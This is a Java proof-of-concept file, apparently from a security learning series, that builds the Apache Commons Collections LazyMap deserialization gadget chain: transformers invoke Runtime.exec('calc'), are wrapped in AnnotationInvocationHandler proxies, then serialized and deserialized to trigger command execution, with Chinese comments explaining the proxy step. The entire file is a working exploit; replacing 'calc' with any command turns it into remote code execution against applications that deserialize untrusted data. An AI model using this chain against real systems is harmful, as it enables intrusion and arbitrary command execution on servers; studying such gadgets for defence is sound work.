package com.yutao.day9;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import org.hibernate.annotations.common.annotationfactory.AnnotationProxy;
//import sun.reflect.annotation.AnnotationInvocationHandler;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class LazyMapPoc {
    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
        };

        Transformer chainedTransformer = new ChainedTransformer(transformers);
        Map map = new HashMap();
//        LazyMap lazyMap = (LazyMap) LazyMap.decorate(map, chainedTransformer);
//        lazyMap.get("adf");

//        map.put("value", "aaa");

        Map transformedMap = LazyMap.decorate(map, chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationhdlConstructor.setAccessible(true);
        //创建一个与代理对象(map)相关联的InvocationHandler
        InvocationHandler ih = (InvocationHandler) annotationInvocationhdlConstructor.newInstance(Target.class, transformedMap);
        // 创建代理对象proxymap，即执行proxymap的任意方法都会替换执行Invocation中的invoke方法
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, ih);

        ih = (InvocationHandler) annotationInvocationhdlConstructor.newInstance(Target.class, proxyMap);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(ih);

        ByteArrayInputStream bin = new ByteArrayInputStream(barr.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bin);
        Object obj = ois.readObject();
    }

}
